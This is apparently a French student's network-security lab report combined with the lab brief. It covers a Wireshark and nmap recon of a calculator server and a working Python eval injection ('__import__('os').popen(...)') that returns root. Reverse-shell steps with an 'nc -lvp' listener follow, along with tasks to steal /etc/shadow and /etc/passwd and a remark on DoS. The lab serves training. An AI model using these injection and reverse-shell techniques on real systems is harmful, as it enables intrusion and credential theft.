. Reconnaissance

🌞 Déterminer

à quelle IP ce client essaie de se co quand on le lance

```
10.1.1.2
```

à quel port il essaie de se co sur cette IP

```
13337
```
vous DEVEZ trouver une autre méthode que la lecture du code pour obtenir ces infos

```
Lecture wireshark : voir "determiner.pcapng"
```


🌞 Scanner le réseau

```
PS C:\Users\vince> nmap -p 13337 10.33.64.0/20 --min-parallelism 10 -oN nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-24 10:28 Paris, Madrid (heure dÆÚtÚ)
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 3.38% done; ETC: 10:29 (0:01:26 remaining)
Stats: 0:02:23 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 80.32% done; ETC: 10:31 (0:00:35 remaining)
Stats: 0:02:26 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 81.07% done; ETC: 10:31 (0:00:34 remaining)
Stats: 0:02:51 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 96.92% done; ETC: 10:31 (0:00:05 remaining)
Stats: 0:03:03 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 27.31% done; ETC: 10:31 (0:00:16 remaining)
Stats: 0:03:27 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.31% done; ETC: 10:32 (0:00:26 remaining)
Stats: 0:04:02 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.93% done; ETC: 10:32 (0:00:14 remaining)
Stats: 0:04:32 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 100.00% done; ETC: 10:33 (0:00:00 remaining)
Nmap scan report for 10.33.64.9
Host is up (0.0050s latency).
```

```
voir : tp5_nmap.pcapng et tp5_nmap.txt
```

🌞 Connectez-vous au serveur

```
Nmap scan report for 🌞10.33.66.78🌞
Host is up (0.045s latency).

PORT      STATE SERVICE
13337/tcp 🌞open🌞  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)
```

```
PS D:\Reseau-Linux\R-seau_B2\TP5> python .\client.py
Veuillez saisir une opération arithmétique : 4+4
'8'
PS D:\Reseau-Linux\R-seau_B2\TP5>
```

```
L'application sert à faire des opérations
```

🌞 Injecter du code serveur

Elements modifiés
```
import os
userMessage = "__import__('os').popen('whoami').read()"
```

```
PS D:\Reseau-Linux\R-seau_B2\TP5> python .\client.py
'root\n'
PS D:\Reseau-Linux\R-seau_B2\TP5>
```

3. Reverse shell
➜ Injecter du code c'est bien mais...

souvent c'est chiant si on veut vraiment prendre le contrôle du serveur
genre ici, à chaque commande, faut lancer une connexion au serveur étou, relou
on pourrait lancer un serveur à nous sur la machine, et s'y connecter, mais s'il y a un firewall, c'est niquéd

reverse shell à la rescousse : l'idée c'est de lancer un shell sur le serveur victime


C'est comme une session SSH, mais c'est à la main, et c'est le serveur qui se connecte à toi pour que toi tu aies le shell. Genre c'est l'inverse de d'habitude. D'où le nom : reverse shell.

➜ Pour pop un reverse shell


en premier

sur une machine que tu contrôles
tu lances un programme en écoute sur un port donné
un ptit nc -lvp 9999 par exemple



en deuxième

sur la machine où tu veux un shell, là où t'as de l'injection de code
tu demandes à l'OS d'ouvrir un port, et de se connecter à ton port ouvert sur la machine que tu contrôles
tu lances un shell (bash par exemple)
ce bash va "s'accrocher" à la session TCP



enfin

tu retournes sur la machine que tu contrôles
et normalement, dans ta session nc -lvp 9999, t'as un shell qui a pop



➜ Long story short

une commande sur une machine que tu contrôles
une commande injectée sur le serveur victime
t'as un shell sur le serveur victime depuis la machine que tu contrôles


Quand tu commences à être bon en bash/réseau étou tu peux pondre ça tout seul. Mais sinon, on se contente de copier des commandes trouvées sur internet c'est très bien.

🌞 Obtenez un reverse shell sur le serveur

si t'as injection de code, t'as sûrement possibilité de pop un reverse shell
y'a plein d'exemple sur le très bon hacktricks


🌞 Pwn

voler les fichiers /etc/shadow et /etc/passwd

voler le code serveur de l'application
déterminer si d'autres services sont disponibles sur la machine


4. Bonus : DOS
Le DOS dans l'esprit, souvent c'est :

d'abord t'es un moldu et tu trouves ça incroyable
tu deviens un tech, tu te rends compte que c'est pas forcément si compliqué, ptet tu essaies
tu deviens meilleur et tu te dis que c'est super lame, c'est nul techniquement, ça mène à rien, exploit c'est mieux
tu deviens conscient, et ptet que parfois, des situations t'amèneront à trouver finalement le principe pas si inutile (politique ? militantisme ?)